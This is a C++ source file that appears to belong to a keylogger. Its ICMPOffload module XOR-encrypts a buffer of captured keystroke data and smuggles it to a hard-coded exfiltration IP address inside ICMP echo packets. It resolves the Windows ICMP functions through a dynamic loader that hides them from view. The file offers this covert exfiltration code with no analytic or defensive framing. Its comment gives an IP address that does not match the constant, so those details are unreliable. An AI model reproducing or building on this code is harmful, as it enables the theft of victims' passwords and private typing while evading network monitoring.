#include "ICMPOffload.h"
#include "XorEnc.h"
#include "types.h"
#include "ExternFnLoader.h"
#include <Windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>

#ifdef _DEBUG
// 172.23.189.202
static constexpr uint32_t EXFIL_IPv4_ADDR = 0x8e51a8c0;
#else
static constexpr uint32_t EXFIL_IPv4_ADDR = 0x8e51a8c0;
#endif
void ICMPOffload::sendData(const KeyBuffer& buffer)
{
    HANDLE icmpFile = ExternFnLdr::Kl_IcmpCreateFile();
    LPVOID replyBuffer = nullptr;
    if (icmpFile == INVALID_HANDLE_VALUE)
        return;
    auto encbuffer = xorEncryptPayload(buffer);
    DWORD replySize = sizeof(ICMP_ECHO_REPLY) + (encbuffer.size() * sizeof(int));
    replyBuffer = (void*)malloc(replySize);
    auto retval = ExternFnLdr::Kl_IcmpSendEcho(
        icmpFile, 
        EXFIL_IPv4_ADDR, 
        encbuffer.data(),
        (encbuffer.size() * 4),
        nullptr, 
        replyBuffer, 
        replySize, 
        1000
    );

    ExternFnLdr::Kl_IcmpCloseHandle(icmpFile);
    free(replyBuffer);


}
